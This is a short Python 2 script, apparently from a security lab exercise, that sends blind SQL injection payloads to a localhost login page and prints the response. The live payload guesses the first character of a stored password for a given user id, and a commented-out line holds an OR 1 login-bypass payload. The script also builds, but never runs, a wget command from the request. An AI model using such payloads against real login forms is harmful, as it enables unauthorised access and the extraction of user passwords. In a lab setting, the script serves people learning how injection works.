import subprocess
import urllib


request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
request = urllib.quote(request)
# request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
bashCommand = "wget  -q -O - " + request 
#bashCommand = "echo 'hello' "
# subprocess.call(['wget','-q','-O','index.html',request])
#output, error = process.communicate()
#print output
#print error
#print bashCommand

f = urllib.urlopen(request)
print f.geturl()
print f.read()